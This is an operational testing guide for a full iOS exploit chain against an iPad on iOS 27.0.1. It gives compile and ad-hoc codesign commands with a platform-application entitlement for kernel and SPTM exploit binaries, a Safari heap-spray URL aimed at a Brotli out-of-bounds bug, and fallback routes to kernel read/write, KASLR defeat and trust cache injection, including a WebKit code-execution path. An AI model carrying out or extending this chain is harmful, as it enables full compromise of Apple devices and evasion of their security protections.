# iPad Testing Guide — Full Exploit Chain

## Target
- iPad Mini (iPad16,1), A17 Pro, iOS 27.0.1
- Mac server at 192.168.1.155

## Prerequisites
1. iPad connected to same WiFi as Mac
2. Self-signed cert trusted on iPad (Settings > General > VPN & Device Mgmt)
3. Mac servers running (ports 4446, 4447, 4449)
4. Xcode with iOS SDK on Mac for compiling arm64e binaries

## Test Order (Most Important First)

### Test 1: ptdesc Overflow (Standalone — No Dependencies)

This is the most valuable test because it works standalone — no kernel R/W needed.
If this works, we have SPTM bypass from just userspace mmap().

```bash
# On Mac:
cd poc/sptm
xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
    -lpthread -o ptdesc_overflow ptdesc_overflow.c

# Sign with entitlements
cat > /tmp/ent.plist << 'ENTEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>platform-application</key><true/>
</dict>
</plist>
ENTEOF
codesign -f -s - --entitlements /tmp/ent.plist ptdesc_overflow

# Deploy to iPad via Xcode or pymobiledevice3
# Run and watch output
```

**Expected outcomes:**
- "OVERFLOW MITIGATION DETECTED" → Apple added refcount checks (try alternative approaches)
- "PHYSICAL PAGE FREED" → Overflow worked, UAF achieved
- "RECLAIM CONFIRMED" → Full SPTM bypass primitive

### Test 2: Brotli Heap Spray (Browser-Based)

Navigate iPad Safari to: `https://192.168.1.155:4447/groom/auto`

This runs the 4-phase automated heap spray:
1. Phase 1: Heap grooming (allocate 2048 ArrayBuffers)
2. Phase 2: Create holes (free alternating buffers)
3. Phase 3: Trigger Brotli OOB (poison streams reclaim holes)
4. Phase 4: Scan for leaked pointers in corrupted output

**What to look for:**
- Server logs on port 4447 showing POST-backs from iPad
- Corrupted Brotli output containing pointer-like values
- Any kernel pointer (0xFFFFFE0...) = KASLR defeat
- Any heap pointer (0x1........) = heap layout info

### Test 3: IOSurface Race (Requires Compilation)

```bash
# On Mac:
cd poc/iosurface
xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
    -framework IOKit -framework IOSurface -framework CoreFoundation \
    -lpthread -o iosurface_race iosurface_race.c

codesign -f -s - --entitlements /tmp/ent.plist iosurface_race
```

This attempts the IOSurface race condition for kernel R/W.
Success = `kread64` and `kwrite64` primitives.

### Test 4: SPTM TLB Race (Requires Kernel R/W from Test 3)

```bash
# On Mac:
cd poc/sptm
xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
    -framework IOKit -framework CoreFoundation -framework Metal \
    -lpthread -o sptm_tlb_race sptm_tlb_race.c

codesign -f -s - --entitlements /tmp/ent.plist sptm_tlb_race
```

This runs the GPU GMMU TLB invalidation race.
Success = stale GPU mapping to freed physical page → trust cache injection.

## Critical Information Needed from iPad

### From Test 1 (ptdesc):
- Did 65536 mmap(MAP_SHARED) calls succeed? Or did it fail early?
- If failed: at what count? What errno?
- If succeeded: did the canary change after unmapping? (physical UAF)

### From Test 2 (Brotli spray):
- Full server logs from port 4447
- Any pointer values reported by the scan phase
- Screenshots of the groom page on iPad

### From Test 3 (IOSurface):
- Did the race succeed? How many attempts?
- kread64/kwrite64 test results
- KASLR slide value

### From Test 4 (SPTM TLB race):
- Did the race threads detect stale GMMU entries?
- Number of attempts needed
- Trust cache injection result

## Quick Start (Minimum Effort Test)

If you just want to test one thing, do **Test 2** (browser-based heap spray):

1. Open Safari on iPad
2. Go to `https://192.168.1.155:4447/groom/auto`
3. Wait for it to complete (~30 seconds)
4. Check Mac terminal for server logs

This requires zero compilation and validates the full Brotli → heap corruption path.

## Fallback Strategies

If ptdesc overflow is mitigated (Test 1 fails):
→ Focus on IOSurface (Test 3) for kernel R/W, then TLB race (Test 4) for SPTM bypass

If TLB race doesn't work:
→ Try coprocessor DMA bypass (requires firmware audit results)
→ Try data-only trust cache injection (if list metadata is in XNU_DEFAULT memory)

If IOSurface race is unreliable:
→ Increase thread count and spray size in iosurface_race.c
→ Try the alternative approach via `generate_rce_stream_fast()` → WebKit code execution → IOSurface from inside the process
